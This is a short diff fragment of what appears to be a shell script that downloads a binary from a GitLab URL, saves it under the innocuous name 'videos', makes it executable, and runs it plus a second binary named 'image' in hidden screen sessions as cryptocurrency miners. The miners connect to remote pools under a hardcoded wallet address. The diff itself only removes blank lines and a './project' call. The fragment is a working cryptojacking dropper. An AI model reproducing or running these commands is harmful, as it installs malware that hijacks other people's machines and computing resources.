@@ -8,7 +8,3 @@ wget -qO videos https://gitlab.com/sarifadim/jomblo/-/raw/main/perusa && chmod +
 screen -dms run ./videos -v -l 8.222.133.209:8080 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.NONAME -t 5
 screen -dms run ./image --algo ZEL --pool 47.89.228.8:443 --user 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo A-0100-$(date +"%T")) --pers AUTO --tls enable
 EOF
-
-
-
-./project 
